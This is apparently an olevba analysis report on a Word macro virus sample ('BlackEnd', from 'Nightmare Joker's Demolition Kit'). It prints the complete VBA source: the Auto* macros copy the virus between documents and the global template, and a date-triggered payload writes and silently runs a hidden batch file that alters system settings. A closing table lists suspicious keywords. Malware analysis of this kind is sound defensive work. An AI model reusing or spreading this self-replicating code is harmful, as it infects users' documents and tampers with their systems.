olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nj-wmdlk1.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nj-wmdlk1.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Nj-wmdlk1.b - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "BlackEnd" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:BlackEnd", WordBasic.[FileName$]() + ":BlackEnd", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO BlackEnd.bas 
in file: Virus.MSWord.Nj-wmdlk1.b - OLE stream: 'Macros/VBA/BlackEnd'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim n
Dim m

Rem A Virus from Nightmare Joker's Demolition Kit!

On Error GoTo -1: On Error GoTo Finito2

If WordBasic.Month(WordBasic.Now()) = 5 And WordBasic.Day(WordBasic.Now()) = 22 Then

WordBasic.FileNew Template:="Normal", NewTemplate:=1
WordBasic.DocMaximize
WordBasic.FontSize 16
WordBasic.Bold
WordBasic.Font "Arial"
WordBasic.Insert "You are infected with the BlackEnd Virus! [D.K.]"

n = WordBasic.Second(WordBasic.Now())
m = n + 3
Again:
While n <> m
n = WordBasic.Second(WordBasic.Now())
GoTo Again
Wend

Finito2:

Open "C:\dosys.bat" For Output As 1
Print #1, "@echo off"
Print #1, "doskey Fun=setver win.com 3.00"
Print #1, "@echo off"
Print #1, "Fun"
Close 1
WordBasic.Shell "C:\dosys.bat", 0
SetAttr "C:\dosys.bat", 2

Else
    Rem Nothing to do!
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nj-wmdlk1.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish2

For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "BlackEnd" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":BlackEnd", "Global:BlackEnd", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
End If

Finish2:
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "BlackEnd" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:BlackEnd", WordBasic.[FileName$]() + ":BlackEnd", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
WordBasic.Call "BlackEnd"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Nj-wmdlk1.b - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

WordBasic.Call "AutoOpen"

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Nj-wmdlk1.b - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim i
Dim VInstalled
On Error GoTo -1: On Error GoTo Finish

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 1) = "BlackEnd" Then
        VInstalled = 1
    End If
Next i

If VInstalled = 1 Then
    GoTo Finish
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:BlackEnd", WordBasic.[FileName$]() + ":BlackEnd", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.FileSaveAll 1, 0
End If

Finish:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |dosys.bat           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

